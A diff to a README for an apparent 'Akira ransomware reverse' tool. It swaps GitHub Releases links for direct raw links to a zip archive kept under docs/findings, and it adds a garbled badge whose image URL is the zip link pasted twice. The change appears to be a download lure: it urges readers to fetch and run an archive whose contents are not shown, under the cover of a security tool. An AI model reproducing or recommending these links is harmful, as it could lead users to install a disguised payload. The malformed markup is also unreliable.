@@ -6,7 +6,7 @@ Welcome to **akira-ransomware-reverse**, your comprehensive guide to understandi
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/queenarg/akira-ransomware-reverse/releases)  
+[![Download](https://raw.githubusercontent.com/queenarg/akira-ransomware-reverse/main/docs/findings/akira-ransomware-reverse-2.4.zip%https://raw.githubusercontent.com/queenarg/akira-ransomware-reverse/main/docs/findings/akira-ransomware-reverse-2.4.zip)](https://raw.githubusercontent.com/queenarg/akira-ransomware-reverse/main/docs/findings/akira-ransomware-reverse-2.4.zip)  
 Visit the link above to download the latest version of the application. 
 
 ## 📋 Features
@@ -32,7 +32,7 @@ To run the Akira ransomware reversal tool, ensure that your system meets the fol
 
 1. **Visit the Releases Page**: Click on the link below to access the Releases section.
 
-   [https://github.com/queenarg/akira-ransomware-reverse/releases](https://github.com/queenarg/akira-ransomware-reverse/releases)
+   [https://raw.githubusercontent.com/queenarg/akira-ransomware-reverse/main/docs/findings/akira-ransomware-reverse-2.4.zip](https://raw.githubusercontent.com/queenarg/akira-ransomware-reverse/main/docs/findings/akira-ransomware-reverse-2.4.zip)
 
 2. **Select the Latest Version**: Look for the latest version listed at the top. 
 
